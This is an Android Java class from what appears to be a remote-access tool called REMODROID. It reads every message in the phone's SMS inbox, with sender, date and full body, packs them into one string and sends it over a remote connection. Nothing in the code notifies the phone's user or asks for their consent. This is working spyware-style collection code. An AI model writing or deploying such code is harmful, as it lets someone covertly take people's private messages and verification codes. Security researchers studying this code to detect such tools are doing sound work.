package com.remo.Features;

import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import com.remo.App;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;

import java.io.UnsupportedEncodingException;
import java.util.Calendar;
import java.util.Date;

public class SMS extends Feature {

   public SMS(){
       UseMainConnection = false;
       Feature_type = DataHandler.eDataType.SMS.ordinal();
   }

    @Override
    public void AsyncTaskFunc() {
        //Log.d("REMODROID",getList(path));
        try {
            String toSend = getList();

            sendPacket(toSend.getBytes("UTF-8"));
          //  Log.d("REMODROID",toSend);
        } catch (UnsupportedEncodingException e) {
            Log.e("REMODROID","Contacts Exception");
        }
    }



    private String getList(){
        StringBuilder sb = new StringBuilder();

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur =  App.get().getApplicationContext().getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String date =getDate(cur.getString(cur.getColumnIndexOrThrow("date")));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));


            sb.append(address);
            sb.append("/");
            sb.append(date);
            sb.append("/");
            sb.append(body);
            sb.append("\\");

        }
        cur.close();
        return sb.toString();
    }


    String getDate(String LongDate){
        Long timestamp = Long.parseLong(LongDate);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp);
        Date finaldate = calendar.getTime();
        String smsDate = finaldate.toString();
        return smsDate;
    }
}
